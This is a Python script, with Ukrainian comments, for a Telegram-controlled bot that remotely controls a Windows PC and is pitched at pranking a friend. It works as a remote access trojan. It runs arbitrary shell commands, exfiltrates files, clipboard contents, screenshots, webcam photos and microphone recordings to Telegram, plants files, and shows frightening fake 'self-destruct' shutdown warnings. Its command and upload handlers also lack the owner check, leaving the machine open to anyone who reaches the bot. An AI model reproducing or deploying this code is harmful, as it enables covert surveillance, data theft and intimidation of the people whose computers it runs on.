import telebot
from telebot import types
import platform
import os
import psutil
import pyautogui
import cv2 
import ctypes
import threading
import webbrowser
import subprocess
import time
import datetime

# --- ДОДАТКОВІ МОДУЛІ ДЛЯ НОВИХ ФУНКЦІЙ ---
import pyttsx3
import sounddevice as sd
from scipy.io.wavfile import write
import pyperclip

time.sleep(15) 

MY_ID = "7678008217" # Твій ID
PC_NAME = platform.node()

# --- ВЕРСІЯ 2.6 (МЕНЮ РОЗІГРАШІВ) ---
BOT_VERSION = "2.6 (Меню розіграшів)"

# Папка бота за дефолтом
botDir = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'ControlPC')
if not os.path.exists(botDir): os.makedirs(botDir)

# --- БЕЗПЕЧНЕ ЧИТАННЯ ТОКЕНА ---
token_file = os.path.join(botDir, "token.txt")

try:
    with open(token_file, "r", encoding="utf-8-sig") as f:
        TOKEN = f.read().strip()
except FileNotFoundError:
    with open(token_file, "w", encoding="utf-8") as f:
        f.write("ВСТАВ_СВІЙ_ТОКЕН_СЮДИ")
    os._exit(0)

bot = telebot.TeleBot(TOKEN)

# ==========================================
# 1. МЕНЮ ТА КНОПКИ
# ==========================================
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎮 Медіа", "⚙️ Система")
    markup.row("📂 Файли", "✨ Трішки магії")
    markup.add("👁 Інфо про ПК")
    return markup

def get_media_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔊 Гучність +", "🔉 Гучність -", "🔇 Мут")
    markup.row("⏯ Плей/Пауза", "🖥 Скріншот")
    markup.add("🔙 Головне меню")
    return markup

def get_system_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📝 Процеси", "📸 Фото з камери")
    markup.row("📋 Буфер обміну", "🔙 Головне меню")
    markup.row("❌ Вимкнути ПК", "🔄 Перезавантажити")
    return markup

def get_files_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📥 Скачати з ПК", "📤 Закинути на ПК")
    markup.add("🔙 Головне меню")
    return markup

def get_magic_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔒 Заблокувати екран", "⚠️ Вивести текст")
    markup.row("🌐 Відкрити сайт", "🗣 Озвучити текст")
    markup.row("🎙 Мікрофон", "⌨️ Друкар (Текст)")
    markup.row("🏓 Пінг", "🎭 Розіграші") # <-- Додали перехід у меню приколів
    markup.add("🔙 Головне меню") 
    return markup

# НОВЕ МЕНЮ ДЛЯ ЖАРТІВ НАД ДРУГОМ
def get_pranks_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🟢 Ефект Матриці", "🔊 Комп'ютер говорить")
    markup.row("🚨 Самознищення", "🛑 Скасувати вимкнення")
    markup.row("🎵 Рикролл")
    markup.add("🔙 Назад до магії")
    return markup

# ==========================================
# 2. СТАРТ ТА ОПОВІЩЕННЯ
# ==========================================
try:
    bot.send_message(MY_ID, f"🟢 Система `[{PC_NAME}]` готова!\n🤖 Версія: {BOT_VERSION}", parse_mode="Markdown", reply_markup=get_main_menu())
except:
    pass

# --- КОМАНДА CMD ---
@bot.message_handler(commands=['cmd'])
def run_command(message):
    cmd_text = message.text.replace('/cmd ', '')
    if cmd_text == '/cmd' or not cmd_text:
        bot.reply_to(message, "Приклад: /cmd dir")
        return
    try:
        final_output = subprocess.getoutput(cmd_text)
        if len(final_output) > 3500:
            final_output = final_output[:3500] + "...[Cut]"
        n = chr(10)
        code_tag = "```"
        full_message = "Результат:" + n + code_tag + n + str(final_output) + n + code_tag
        bot.send_message(message.chat.id, full_message, parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, "Помилка: " + str(e))
        
# --- ДЕФОЛТНИЙ ПРИЙОМ ФАЙЛІВ ---
@bot.message_handler(content_types=['document', 'photo'])
def handle_upload(message):
    try:
        upload_path = os.path.join(botDir, "Downloads")
        if not os.path.exists(upload_path): os.makedirs(upload_path)
        file_info = bot.get_file(message.document.file_id if message.document else message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name if message.document else f"photo_{int(time.time())}.jpg"
        src = os.path.join(upload_path, file_name)
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f"✅ Файл збережено в дефолтну папку:\n`{src}`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Помилка завантаження: {e}")        

@bot.message_handler(commands=['start'])
def start_command(message):
    if str(message.chat.id) == str(MY_ID):
        bot.send_message(MY_ID, f"Керування: {PC_NAME}", reply_markup=get_main_menu())

# ==========================================
# 3. ДОДАТКОВІ ФУНКЦІЇ БОТА
# ==========================================
def process_download(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    path = message.text.strip()
    try:
        if os.path.exists(path):
            if os.path.isdir(path):
                bot.send_message(MY_ID, "❌ Це папка. Вкажи шлях до файлу.")
                return
            file_size_mb = os.path.getsize(path) / (1024 * 1024)
            if file_size_mb > 49:
                bot.send_message(MY_ID, f"❌ Файл занадто великий ({file_size_mb:.1f} МБ). Ліміт Telegram - 50 МБ.")
                return
            bot.send_message(MY_ID, f"⏳ Завантажую файл ({file_size_mb:.1f} МБ)...")
            with open(path, "rb") as doc:
                bot.send_document(MY_ID, doc)
        else:
            bot.send_message(MY_ID, f"❌ Файл не знайдено за шляхом:\n`{path}`", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка: {str(e)}")

def process_alert(message):
    if message.text == "🔙 Головне меню": return
    text = message.text
    def show_msg():
        ctypes.windll.user32.MessageBoxW(0, text, "Повідомлення Системи", 0x40000 | 0x30)
    threading.Thread(target=show_msg).start()
    bot.send_message(MY_ID, "✅ Повідомлення відкрито на екрані ПК!")

def process_website(message):
    if message.text == "🔙 Головне меню": return
    url = message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url
    webbrowser.open(url)
    bot.send_message(MY_ID, f"✅ Відкрито сайт: {url}")

def process_upload_path(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    target_path = message.text.strip()
    if target_path.lower() == "дефолт":
        target_path = os.path.join(botDir, "Downloads")
        
    if not os.path.exists(target_path):
        try:
            os.makedirs(target_path)
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Не вдалося створити або знайти таку папку: {e}. Спробуй ще раз.")
            return
            
    msg_prompt = bot.send_message(MY_ID, f"📁 Папку вибрано: `{target_path}`\n\nТепер надішли мені **файл або фото**, і я збережу його саме туди.", parse_mode="Markdown")
    bot.register_next_step_handler(msg_prompt, process_upload_file, target_path)

def process_upload_file(message, target_path):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    if not (message.document or message.photo):
        bot.send_message(MY_ID, "❌ Це не файл і не фото. Процес скасовано.", reply_markup=get_main_menu())
        return
    try:
        file_info = bot.get_file(message.document.file_id if message.document else message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name if message.document else f"photo_{int(time.time())}.jpg"
        src = os.path.join(target_path, file_name)
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        bot.reply_to(message, f"✅ Файл успішно збережено в:\n`{src}`", parse_mode="Markdown", reply_markup=get_main_menu())
    except Exception as e:
        bot.reply_to(message, f"❌ Помилка збереження: {e}", reply_markup=get_main_menu())

def process_typing(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    text = message.text
    try:
        old_clipboard = pyperclip.paste()
        pyperclip.copy(text)
        pyautogui.hotkey('ctrl', 'v')
        time.sleep(0.1)
        pyperclip.copy(old_clipboard)
        bot.send_message(MY_ID, "✅ Текст успішно введено на клавіатурі ПК!")
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка введення тексту: {e}")

def process_tts_text(message):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
    text = message.text
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🐢 Повільно", "🚶 Нормально", "🚀 Швидко")
    markup.add("🔙 Головне меню")
    
    msg_prompt = bot.send_message(MY_ID, "Обери швидкість озвучування:", reply_markup=markup)
    bot.register_next_step_handler(msg_prompt, process_tts_speak, text)

def process_tts_speak(message, text):
    if message.text == "🔙 Головне меню":
        bot.send_message(MY_ID, "Відміна.", reply_markup=get_main_menu())
        return
        
    speed_choice = message.text
    rate = 145
    if speed_choice == "🐢 Повільно": rate = 115
    elif speed_choice == "🚀 Швидко": rate = 185
    
    bot.send_message(MY_ID, "🗣 Озвучую на комп'ютері...", reply_markup=get_magic_menu())
    
    def speak_thread():
        try:
            engine = pyttsx3.init()
            engine.setProperty('rate', rate)
            voices = engine.getProperty('voices')
            cyrillic_voice = None
            for voice in voices:
                v_name = voice.name.lower()
                v_id = voice.id.lower()
                if "ukrainian" in v_name or "uk" in v_id or "anatol" in v_name or "lesya" in v_name:
                    cyrillic_voice = voice.id
                    break
            if not cyrillic_voice:
                for voice in voices:
                    v_name = voice.name.lower()
                    v_id = voice.id.lower()
                    if "russian" in v_name or "ru" in v_id or "elena" in v_name or "irina" in v_name:
                        cyrillic_voice = voice.id
                        break
            if cyrillic_voice:
                engine.setProperty('voice', cyrillic_voice)
                
            time.sleep(0.8)
            engine.say(text)
            engine.runAndWait()
            bot.send_message(MY_ID, "✅ Озвучено успішно!")
        except Exception as e:
            bot.send_message(MY_ID, f"❌ Помилка звукового рушія: {e}")
            
    threading.Thread(target=speak_thread).start()

def record_audio_func():
    try:
        seconds = 10
        fs = 44100
        output_file = os.path.join(botDir, "output.wav")
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(output_file, fs, myrecording)
        with open(output_file, 'rb') as audio:
            bot.send_voice(MY_ID, audio)
        os.remove(output_file)
    except Exception as e:
        bot.send_message(MY_ID, f"❌ Помилка запису: {e}")

# ==========================================
# 4. ГОЛОВНИЙ ОБРОБНИК КОМАНД ТА КНОПОК
# ==========================================
@bot.message_handler(content_types=['text'])
def handle_text(message):
    if str(message.chat.id) != str(MY_ID): return
    msg = message.text

    # --- НАВІГАЦІЯ ---
    if msg == "🔙 Головне меню":
        bot.send_message(MY_ID, "Головне меню:", reply_markup=get_main_menu())
    elif msg == "🎮 Медіа":
        bot.send_message(MY_ID, "Панель медіа:", reply_markup=get_media_menu())
    elif msg == "⚙️ Система":
        bot.send_message(MY_ID, "Системні налаштування:", reply_markup=get_system_menu())
    elif msg == "📂 Файли":
        bot.send_message(MY_ID, "Робота з файлами:", reply_markup=get_files_menu())
    elif msg == "✨ Трішки магії":
        bot.send_message(MY_ID, "Секретні функції:", reply_markup=get_magic_menu())
    elif msg == "🎭 Розіграші":
        bot.send_message(MY_ID, "🎭 Меню розіграшів (Твій друг буде в шоці):", reply_markup=get_pranks_menu())
    elif msg == "🔙 Назад до магії":
        bot.send_message(MY_ID, "Повертаюсь до магії:", reply_markup=get_magic_menu())
    
    # --- ІНФО ТА МЕДІА ---
    elif msg == "👁 Інфо про ПК":
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        bot.send_message(MY_ID, f"💻 ПК: {PC_NAME}\n🤖 Версія бота: {BOT_VERSION}\n🧠 CPU: {cpu}%\n💾 RAM: {ram}%")
    elif msg == "🔊 Гучність +": pyautogui.press("volumeup", presses=5)
    elif msg == "🔉 Гучність -": pyautogui.press("volumedown", presses=5)
    elif msg == "🔇 Мут": pyautogui.press("volumemute")
    elif msg == "⏯ Плей/Пауза": pyautogui.press("playpause")
    elif msg == "🖥 Скріншот":
        pyautogui.screenshot("screen.png")
        with open("screen.png", "rb") as f: bot.send_photo(MY_ID, f)
        os.remove("screen.png")
    
    # --- СИСТЕМА ТА ІНШЕ ---
    elif msg == "📸 Фото з камери":
        bot.send_message(MY_ID, "Робимо photo... 📷")
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("cam.jpg", frame)
                with open("cam.jpg", "rb") as f: bot.send_photo(MY_ID, f)
                os.remove("cam.jpg")
            cap.release()
        else:
            bot.send_message(MY_ID, "❌ Камера не знайдена або зайнята іншою програмою.")
    elif msg == "📝 Процеси":
        procs = sorted(psutil.process_iter(['name', 'memory_percent']), key=lambda x: x.info['memory_percent'], reverse=True)[:5]
        text = "🔝 ТОП-5 процесів:\n" + "\n".join([f"🔸 {p.info['name']} ({round(p.info['memory_percent'],1)}%)" for p in procs])
        bot.send_message(MY_ID, text)
    elif msg == "📋 Буфер обміну":
        text = pyperclip.paste()
        bot.send_message(MY_ID, f"📋 Текст у буфері ПК:\n`{text}`", parse_mode="Markdown")

    # --- ТЕСТОВА КНОПКА ---
    elif msg == "🏓 Пінг":
        bot.send_message(MY_ID, f"🏓 Понг! Бот оновився успішно і працює чудово!\nПоточна версія: `{BOT_VERSION}`", parse_mode="Markdown")

    # --- 🔥 КНОПКИ РОЗІГРАШІВ СЕРЕД ДРУЗІВ ---
    elif msg == "🟢 Ефект Матриці":
        # start примусово відкриває видиме вікно CMD, а cmd /v /k вмикає випадкові числа зеленого кольору
        os.system('start cmd /v /k "color 0a & mode con: cols=80 lines=25 & for /L %i in () do @echo !random! !random! !random! !random! !random!"')
        bot.send_message(MY_ID, "🟢 Розіграш 'Матриця' запущено на екрані ПК!")

    elif msg == "🔊 Комп'ютер говорить":
        os.system('mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""Hello. I am watching you.""):close")')
        bot.send_message(MY_ID, "🔊 Голос успішно відтворено через динаміки ноутбука!")

    elif msg == "🚨 Самознищення":
        os.system('shutdown /s /t 90 /c "Увага! Виявлено критичний перегрів процесора. Ноутбук вибухне через 90 секунд."')
        bot.send_message(MY_ID, "🚨 Таймер запущено! У тебе є 90 секунд, щоб натиснути кнопку скасування!")

    elif msg == "🛑 Скасувати вимкнення":
        os.system('shutdown /a')
        bot.send_message(MY_ID, "🛑 Фейкове самознищення успішно скасовано! Друг може видихнути.")

    elif msg == "🎵 Рикролл":
        webbrowser.open('[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ)')
        bot.send_message(MY_ID, "🎵 Рикролл активовано! Rick Astley вже співає на повну.")

    # --- СКЛАДНІ ФУНКЦІЇ КЕРУВАННЯ ---
    elif msg == "📥 Скачати файл з ПК":
        msg_prompt = bot.send_message(MY_ID, "📁 Напиши повний шлях до файлу:", parse_mode="Markdown")
        bot.register_next_step_handler(msg_prompt, process_download)
        
    elif msg == "📤 Закинути на ПК":
        msg_prompt = bot.send_message(MY_ID, "📂 Куди саме зберегти файл? Напиши шлях або `дефолт`:", parse_mode="Markdown")
        bot.register_next_step_handler(msg_prompt, process_upload_path)

    elif msg == "⚠️ Вивести текст":
        msg_prompt = bot.send_message(MY_ID, "💬 Напиши текст для вікна на ПК:")
        bot.register_next_step_handler(msg_prompt, process_alert)

    elif msg == "🌐 Відкрити сайт":
        msg_prompt = bot.send_message(MY_ID, "🌍 Скинь посилання:")
        bot.register_next_step_handler(msg_prompt, process_website)

    elif msg == "🗣 Озвучити текст":
        msg_prompt = bot.send_message(MY_ID, "🗣 Що сказати голосом через динаміки ПК?")
        bot.register_next_step_handler(msg_prompt, process_tts_text)

    elif msg == "🎙 Мікрофон":
        bot.send_message(MY_ID, "🎙 Записую 10 секунд звуку...")
        threading.Thread(target=record_audio_func).start()
        
    elif msg == "⌨️ Друкар (Текст)":
        msg_prompt = bot.send_message(MY_ID, "⌨️ Введіть текст для автодруку на ПК:")
        bot.register_next_step_handler(msg_prompt, process_typing)

    elif msg == "🔒 Заблокувати екран":
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(MY_ID, "✅ Windows заблоковано!")

    # --- ЖИВЛЕННЯ ---
    elif msg == "❌ Вимкнути ПК":
        bot.send_message(MY_ID, "Вимикаю...")
        os.system("shutdown /s /t 5")
    elif msg == "🔄 Перезавантажити":
        bot.send_message(MY_ID, "Перезавантажую...")
        os.system("shutdown /r /t 5")

if __name__ == "__main__":
    while True:
        try:
            print("Бот запущений...")
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            error_log = os.path.join(botDir, "bot_errors.txt")
            with open(error_log, "a", encoding="utf-8") as f:
                f.write(f"Помилка мережі/бота ({datetime.datetime.now()}): {str(e)}\n")
            time.sleep(5)